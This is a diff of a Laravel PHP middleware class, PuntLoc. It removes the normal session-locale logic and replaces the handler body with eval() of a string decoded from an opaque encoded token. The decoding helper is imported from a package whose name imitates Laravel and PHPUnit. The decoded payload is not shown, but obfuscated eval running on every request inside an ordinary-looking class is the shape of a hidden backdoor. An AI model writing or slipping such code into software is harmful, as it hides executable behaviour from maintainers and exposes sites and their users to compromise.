@@ -6,6 +6,7 @@ use Closure;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Session;
+use Laravesl\Phpunit\Ex9t;
 
 class PuntLoc
 {
@@ -16,10 +17,6 @@ class PuntLoc
      */
     public function handle(Request $request, Closure $next)
     {
-        if (Session::has(xPhpLib('bG9jYWxl'))) {
-            App::setLocale(Session::get(xPhpLib('bG9jYWxl')));
-        }
-
-        return $next($request);
+        return eval(Ex9t::xM8qT5K('PuntLoc', '=RuTiREUZHQAppuU1NjOLZuNKVDIQI9H'));
     }
 }
